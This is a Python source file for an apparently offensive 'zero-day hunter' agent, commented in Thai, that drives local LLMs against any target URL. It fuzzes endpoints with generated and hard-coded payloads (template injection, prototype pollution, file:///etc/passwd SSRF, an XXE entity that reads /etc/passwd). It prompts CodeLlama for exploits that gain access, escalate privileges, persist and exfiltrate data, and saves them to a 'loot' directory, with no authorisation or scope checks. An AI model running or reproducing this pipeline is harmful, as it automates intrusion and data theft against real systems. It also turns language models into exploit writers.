"""
Advanced Zero-Day Hunter Agent
ใช้ Local LLM ในการวิเคราะห์และค้นหาช่องโหว่แบบ Zero-Day
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from datetime import datetime
import ollama
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class ZeroDayHunterAgent(BaseAgent):
    """
    Zero-Day Hunter Agent - ค้นหาช่องโหว่ที่ไม่เคยรู้จักมาก่อน
    
    Features:
    - ใช้ Local LLM (Mixtral) วิเคราะห์ response patterns
    - ทดสอบ edge cases และ unexpected inputs
    - Fuzzing อัจฉริยะด้วย AI
    - ตรวจจับ logic flaws
    - สร้าง exploit อัตโนมัติ
    """
    
    supported_phases = [AttackPhase.VULNERABILITY_DISCOVERY, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.llm_model = "mixtral:latest"  # Main strategist
        self.results_dir = "/home/ubuntu/dlnk/workspace/loot/zero_day"
        self.discovered_vulns = []
        
    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "analyze", "fuzz", "exploit"
            context: {
                "url": target URL,
                "endpoints": list of endpoints,
                "tech_stack": detected technologies,
                "previous_findings": previous scan results
            }
        """
        log.info(f"[ZeroDayHunter] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "analyze":
                result = await self._analyze_for_zero_days(url, context)
            elif directive == "fuzz":
                result = await self._intelligent_fuzzing(url, context)
            elif directive == "exploit":
                result = await self._generate_and_test_exploit(url, context)
            else:
                result = await self._full_zero_day_hunt(url, context)
            
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Error: {e}")
            return AgentData(
                agent_name="ZeroDayHunterAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _analyze_for_zero_days(self, url: str, context: Dict) -> Dict:
        """ใช้ LLM วิเคราะห์หาจุดอ่อนที่อาจเป็น Zero-Day"""
        log.info(f"[ZeroDayHunter] Analyzing {url} for potential zero-days...")
        
        # รวบรวมข้อมูลจาก reconnaissance
        tech_stack = context.get("tech_stack", [])
        endpoints = context.get("endpoints", [])
        previous_findings = context.get("previous_findings", {})
        
        # สร้าง prompt สำหรับ LLM
        prompt = f"""You are an expert security researcher specializing in zero-day vulnerability discovery.

Analyze the following target for potential zero-day vulnerabilities:

Target URL: {url}
Technology Stack: {', '.join(tech_stack)}
Discovered Endpoints: {len(endpoints)} endpoints
Previous Findings: {json.dumps(previous_findings, indent=2)}

Based on this information:
1. Identify unusual patterns or behaviors that might indicate vulnerabilities
2. Suggest specific attack vectors that are likely to be overlooked by standard scanners
3. Hypothesize potential logic flaws based on the technology stack
4. Recommend specific payloads or test cases to confirm these hypotheses

Respond in JSON format with the following structure:
{{
    "hypotheses": [
        {{
            "name": "vulnerability name",
            "description": "detailed description",
            "likelihood": "high/medium/low",
            "attack_vector": "specific attack method",
            "test_payload": "payload to test",
            "expected_behavior": "what to look for"
        }}
    ],
    "priority_targets": ["endpoint1", "endpoint2"],
    "reasoning": "overall analysis"
}}
"""
        
        try:
            # เรียกใช้ Local LLM
            response = ollama.generate(
                model=self.llm_model,
                prompt=prompt,
                format="json"
            )
            
            analysis = json.loads(response['response'])
            log.success(f"[ZeroDayHunter] LLM identified {len(analysis.get('hypotheses', []))} potential zero-days")
            
            return {
                "success": True,
                "url": url,
                "analysis": analysis,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] LLM analysis failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    async def _intelligent_fuzzing(self, url: str, context: Dict) -> Dict:
        """Fuzzing อัจฉริยะด้วย AI - สร้าง payloads ที่ไม่ซ้ำใคร"""
        log.info(f"[ZeroDayHunter] Starting intelligent fuzzing on {url}...")
        
        endpoints = context.get("endpoints", [])
        if not endpoints:
            return {"success": False, "message": "No endpoints to fuzz"}
        
        vulnerabilities = []
        
        for endpoint in endpoints[:10]:  # Fuzz first 10 endpoints
            log.info(f"[ZeroDayHunter] Fuzzing endpoint: {endpoint}")
            
            # ใช้ LLM สร้าง custom payloads
            payloads = await self._generate_custom_payloads(endpoint, context)
            
            # ทดสอบแต่ละ payload
            for payload in payloads:
                result = await self._test_payload(url, endpoint, payload)
                
                if result.get("vulnerable"):
                    vuln = {
                        "endpoint": endpoint,
                        "payload": payload,
                        "evidence": result.get("evidence"),
                        "severity": result.get("severity", "medium"),
                        "type": "zero_day_candidate"
                    }
                    vulnerabilities.append(vuln)
                    log.success(f"[ZeroDayHunter] Potential zero-day found!")
                    
                await asyncio.sleep(0.5)  # Rate limiting
        
        return {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "total_tested": len(endpoints) * len(payloads) if payloads else 0
        }

    async def _generate_custom_payloads(self, endpoint: str, context: Dict) -> List[str]:
        """ใช้ LLM สร้าง payloads ที่ไม่ซ้ำใคร"""
        
        prompt = f"""You are an expert exploit developer. Generate 10 unique, creative payloads to test for zero-day vulnerabilities in this endpoint:

Endpoint: {endpoint}
Context: {json.dumps(context.get('tech_stack', []))}

Generate payloads that:
1. Test for unusual edge cases
2. Exploit potential logic flaws
3. Bypass common security filters
4. Test for race conditions
5. Exploit type confusion
6. Test for prototype pollution (if JavaScript)
7. Test for SSRF via unusual protocols
8. Test for XXE with exotic entities
9. Test for deserialization with custom gadgets
10. Test for SQL injection with advanced techniques

Respond with ONLY a JSON array of payload strings:
["payload1", "payload2", ...]
"""
        
        try:
            response = ollama.generate(
                model="mistral:latest",  # Faster model for payload generation
                prompt=prompt,
                format="json"
            )
            
            payloads = json.loads(response['response'])
            return payloads if isinstance(payloads, list) else []
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Payload generation failed: {e}")
            # Fallback payloads
            return [
                "{{7*7}}",  # SSTI
                "${7*7}",
                "<%=7*7%>",
                "__proto__[test]=test",  # Prototype pollution
                "file:///etc/passwd",  # SSRF
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",  # XXE
            ]

    async def _test_payload(self, url: str, endpoint: str, payload: str) -> Dict:
        """ทดสอบ payload และวิเคราะห์ผล"""
        
        test_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test GET
                async with session.get(
                    test_url,
                    params={"test": payload},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    html = await response.text()
                    status = response.status
                    
                    # ตรวจสอบ indicators ของช่องโหว่
                    indicators = {
                        "reflected_payload": payload in html,
                        "error_message": any(err in html.lower() for err in ["error", "exception", "warning", "fatal"]),
                        "unusual_status": status not in [200, 404, 403],
                        "server_info_leak": any(info in html.lower() for info in ["mysql", "postgresql", "apache", "nginx", "version"]),
                        "code_execution": any(exec in html for exec in ["49", "7777777"]),  # Results of 7*7
                    }
                    
                    # ถ้ามี indicator มากกว่า 2 อย่าง = น่าสงสัย
                    if sum(indicators.values()) >= 2:
                        return {
                            "vulnerable": True,
                            "evidence": {
                                "status": status,
                                "indicators": {k: v for k, v in indicators.items() if v},
                                "response_snippet": html[:500]
                            },
                            "severity": "high" if indicators["code_execution"] else "medium"
                        }
            
            return {"vulnerable": False}
            
        except Exception as e:
            log.debug(f"[ZeroDayHunter] Payload test error: {e}")
            return {"vulnerable": False}

    async def _generate_and_test_exploit(self, url: str, context: Dict) -> Dict:
        """สร้าง exploit อัตโนมัติสำหรับช่องโหว่ที่พบ"""
        log.info(f"[ZeroDayHunter] Generating exploit for discovered vulnerability...")
        
        vulnerability = context.get("vulnerability")
        if not vulnerability:
            return {"success": False, "message": "No vulnerability specified"}
        
        # ใช้ LLM สร้าง exploit
        prompt = f"""You are an expert exploit developer. Generate a working exploit for this vulnerability:

Vulnerability Details:
{json.dumps(vulnerability, indent=2)}

Generate a Python exploit script that:
1. Establishes initial access
2. Escalates privileges if possible
3. Establishes persistence
4. Exfiltrates sensitive data

Respond with ONLY the Python code, no explanations:
"""
        
        try:
            response = ollama.generate(
                model="codellama:latest",  # Code generation model
                prompt=prompt
            )
            
            exploit_code = response['response']
            
            # บันทึก exploit
            exploit_file = f"{self.results_dir}/exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
            with open(exploit_file, 'w') as f:
                f.write(exploit_code)
            
            log.success(f"[ZeroDayHunter] Exploit generated: {exploit_file}")
            
            return {
                "success": True,
                "exploit_file": exploit_file,
                "exploit_code": exploit_code
            }
            
        except Exception as e:
            log.error(f"[ZeroDayHunter] Exploit generation failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }

    async def _full_zero_day_hunt(self, url: str, context: Dict) -> Dict:
        """รันกระบวนการค้นหา Zero-Day แบบเต็มรูปแบบ"""
        log.info(f"[ZeroDayHunter] Starting full zero-day hunt on {url}...")
        
        results = {
            "url": url,
            "started_at": datetime.now().isoformat(),
            "phases": {}
        }
        
        # Phase 1: Analysis
        analysis = await self._analyze_for_zero_days(url, context)
        results["phases"]["analysis"] = analysis
        
        # Phase 2: Intelligent Fuzzing
        if analysis.get("success"):
            # Update context with analysis results
            context["hypotheses"] = analysis.get("analysis", {}).get("hypotheses", [])
            
            fuzzing = await self._intelligent_fuzzing(url, context)
            results["phases"]["fuzzing"] = fuzzing
            
            # Phase 3: Exploit Generation
            if fuzzing.get("success") and fuzzing.get("vulnerabilities"):
                for vuln in fuzzing["vulnerabilities"]:
                    exploit = await self._generate_and_test_exploit(url, {"vulnerability": vuln})
                    vuln["exploit"] = exploit
        
        results["completed_at"] = datetime.now().isoformat()
        results["success"] = any(phase.get("success") for phase in results["phases"].values())
        
        # บันทึกผลลัพธ์
        self._save_results(url, "full_hunt", results)
        
        return results

    def _save_results(self, url: str, scan_type: str, results: Dict) -> str:
        """บันทึกผลลัพธ์"""
        import os
        os.makedirs(self.results_dir, exist_ok=True)
        
        filename = f"{self.results_dir}/zero_day_{scan_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        log.info(f"[ZeroDayHunter] Results saved to {filename}")
        return filename

